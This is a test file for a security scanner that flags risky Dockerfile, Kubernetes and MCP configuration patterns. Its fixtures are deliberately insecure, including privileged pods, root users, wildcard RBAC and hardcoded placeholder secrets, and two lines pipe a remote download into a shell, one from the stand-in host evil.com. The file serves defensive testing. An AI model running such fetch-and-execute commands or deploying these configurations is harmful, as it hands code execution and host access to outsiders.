import { describe, it, expect, beforeAll } from '../helpers/expect.js';
import { Scanner } from '../../src/scanner.js';
import { promises as fs } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

describe('Infrastructure Security Scanner', () => {
  let scanner: Scanner;
  let testDir: string;

  beforeAll(async () => {
    scanner = new Scanner();
    // Create a temporary directory for test fixtures
    testDir = join(tmpdir(), `mcp-safeguard-infra-test-${Date.now()}`);
    await fs.mkdir(testDir, { recursive: true });
  });

  describe('Infrastructure File Detection', () => {
    it('should detect Dockerfile', async () => {
      const dockerfilePath = join(testDir, 'Dockerfile');
      await fs.writeFile(dockerfilePath, 'FROM node:latest\nRUN apt-get update');

      const result = await scanner.scan(testDir);
      expect(result.metadata.hasInfrastructure).toBe(true);
    });

    it('should detect Kubernetes YAML files', async () => {
      const k8sPath = join(testDir, 'deployment.yaml');
      await fs.writeFile(k8sPath, 'apiVersion: v1\nkind: Pod');

      const result = await scanner.scan(testDir);
      expect(result.metadata.hasInfrastructure).toBe(true);
    });

    it('should detect MCP config files', async () => {
      const mcpPath = join(testDir, 'mcp.json');
      await fs.writeFile(mcpPath, '{"mcpServers": {}}');

      const result = await scanner.scan(testDir);
      expect(result.metadata.hasInfrastructure).toBe(true);
    });

    it('should return false when no infrastructure files present', async () => {
      const emptyDir = join(testDir, 'empty');
      await fs.mkdir(emptyDir, { recursive: true });
      await fs.writeFile(join(emptyDir, 'app.js'), 'console.log("test");');

      const result = await scanner.scan(emptyDir);
      expect(result.metadata.hasInfrastructure).toBe(false);
    });
  });

  describe('Dockerfile Security Rules', () => {
    it('should detect unpinned base image', async () => {
      const dockerfile = join(testDir, 'unpinned.dockerfile');
      await fs.writeFile(dockerfile, 'FROM node:latest\nRUN npm install');

      const result = await scanner.scan(dockerfile);
      const finding = result.findings.find(f => f.check_id.includes('unpinned-base-image'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('WARNING');
    });

    it('should detect root user', async () => {
      const dockerfile = join(testDir, 'root.dockerfile');
      await fs.writeFile(dockerfile, 'FROM node:16\nUSER root\nRUN npm install');

      const result = await scanner.scan(dockerfile);
      const finding = result.findings.find(f => f.check_id.includes('root-user'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('ERROR');
    });

    it('should detect hardcoded secrets in ENV', async () => {
      const dockerfile = join(testDir, 'secrets.dockerfile');
      await fs.writeFile(dockerfile, 'FROM node:16\nENV API_KEY=EXAMPLE_API_KEY_DO_NOT_USE\nENV DATABASE_PASSWORD=secret123');

      const result = await scanner.scan(dockerfile);
      const findings = result.findings.filter(f => f.check_id.includes('hardcoded-secret-env'));

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0]?.severity).toBe('ERROR');
    });

    it('should detect overly broad COPY', async () => {
      const dockerfile = join(testDir, 'copy.dockerfile');
      await fs.writeFile(dockerfile, 'FROM node:16\nCOPY . .\nRUN npm install');

      const result = await scanner.scan(dockerfile);
      const finding = result.findings.find(f => f.check_id.includes('overly-broad-copy'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('WARNING');
    });

    it('should detect dangerous curl pipe sh', async () => {
      const dockerfile = join(testDir, 'curl.dockerfile');
      await fs.writeFile(dockerfile, 'FROM node:16\nRUN curl https://get.docker.com | sh');

      const result = await scanner.scan(dockerfile);
      const finding = result.findings.find(f => f.check_id.includes('curl-pipe-sh'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('ERROR');
    });
  });

  describe('Kubernetes Security Rules', () => {
    it('should detect privileged pod', async () => {
      const k8sFile = join(testDir, 'pod-privileged.yaml');
      const content = `
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    securityContext:
      privileged: true
`;
      await fs.writeFile(k8sFile, content);

      const result = await scanner.scan(k8sFile);
      const finding = result.findings.find(f => f.check_id.includes('privileged-pod'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('ERROR');
    });

    it('should detect hostNetwork enabled', async () => {
      const k8sFile = join(testDir, 'pod-hostnet.yaml');
      const content = `
apiVersion: v1
kind: Pod
spec:
  hostNetwork: true
  containers:
  - name: app
`;
      await fs.writeFile(k8sFile, content);

      const result = await scanner.scan(k8sFile);
      const finding = result.findings.find(f => f.check_id.includes('host-network'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('ERROR');
    });

    it('should detect hostPath volume mount', async () => {
      const k8sFile = join(testDir, 'pod-hostpath.yaml');
      const content = `
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
  volumes:
  - name: host-vol
    hostPath:
      path: /
`;
      await fs.writeFile(k8sFile, content);

      const result = await scanner.scan(k8sFile);
      const finding = result.findings.find(f => f.check_id.includes('host-path-mount'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('ERROR');
    });

    it('should detect root container (runAsUser 0)', async () => {
      const k8sFile = join(testDir, 'pod-root.yaml');
      const content = `
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    securityContext:
      runAsUser: 0
`;
      await fs.writeFile(k8sFile, content);

      const result = await scanner.scan(k8sFile);
      const finding = result.findings.find(f => f.check_id.includes('root-containers'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('ERROR');
    });

    it('should detect overly permissive RBAC', async () => {
      const k8sFile = join(testDir, 'role-permissive.yaml');
      const content = `
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
`;
      await fs.writeFile(k8sFile, content);

      const result = await scanner.scan(k8sFile);
      const finding = result.findings.find(f => f.check_id.includes('overly-permissive-rbac'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('ERROR');
    });

    it('should detect secret in environment variable', async () => {
      const k8sFile = join(testDir, 'pod-secret-env.yaml');
      const content = `
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    env:
    - name: DATABASE_PASSWORD
      value: "hardcoded-secret"
`;
      await fs.writeFile(k8sFile, content);

      const result = await scanner.scan(k8sFile);
      const finding = result.findings.find(f => f.check_id.includes('secret-in-env'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('ERROR');
    });
  });

  describe('MCP Config Security Rules', () => {
    it('should detect allowUnauthenticated enabled', async () => {
      const mcpFile = join(testDir, 'mcp-unauth.json');
      const content = JSON.stringify({
        mcpServers: {
          server1: {
            allowUnauthenticated: true
          }
        }
      });
      await fs.writeFile(mcpFile, content);

      const result = await scanner.scan(mcpFile);
      const finding = result.findings.find(f => f.check_id.includes('allow-unauthenticated'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('ERROR');
    });

    it('should detect insecure transport (http)', async () => {
      const mcpFile = join(testDir, 'mcp-http.json');
      const content = JSON.stringify({
        mcpServers: {
          server1: {
            transport: "http"
          }
        }
      });
      await fs.writeFile(mcpFile, content);

      const result = await scanner.scan(mcpFile);
      const finding = result.findings.find(f => f.check_id.includes('insecure-transport'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('ERROR');
    });

    it('should detect overly broad CORS', async () => {
      const mcpFile = join(testDir, 'mcp-cors.json');
      const content = JSON.stringify({
        mcpServers: {
          server1: {
            cors: {
              origin: "*"
            }
          }
        }
      });
      await fs.writeFile(mcpFile, content);

      const result = await scanner.scan(mcpFile);
      const finding = result.findings.find(f => f.check_id.includes('overly-broad-cors'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('WARNING');
    });

    it('should detect disabled logging', async () => {
      const mcpFile = join(testDir, 'mcp-nolog.json');
      const content = JSON.stringify({
        mcpServers: {
          server1: {
            logging: false
          }
        }
      });
      await fs.writeFile(mcpFile, content);

      const result = await scanner.scan(mcpFile);
      const finding = result.findings.find(f => f.check_id.includes('disabled-logging'));

      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('WARNING');
    });
  });

  describe('Infrastructure Findings Categorization', () => {
    it('should categorize infrastructure findings correctly', async () => {
      const dockerfile = join(testDir, 'multi.dockerfile');
      await fs.writeFile(dockerfile, 'FROM node:latest\nUSER root\nENV API_KEY=secret');

      const result = await scanner.scan(dockerfile);
      const infraFindings = result.findings.filter(f => f.category === 'infrastructure');

      expect(infraFindings.length).toBeGreaterThan(0);
      expect(result.summary.byCategory['infrastructure']).toBeGreaterThan(0);
    });

    it('should include infrastructure in risk score calculation', async () => {
      const dockerfile = join(testDir, 'risky.dockerfile');
      await fs.writeFile(dockerfile,
        'FROM node:latest\nUSER root\nENV SECRET_KEY=abc123\nRUN curl https://evil.com | sh');

      const result = await scanner.scan(dockerfile);

      expect(result.summary.riskScore).toBeGreaterThan(0);
      expect(result.summary.bySeverity.ERROR).toBeGreaterThan(0);
    });
  });
});
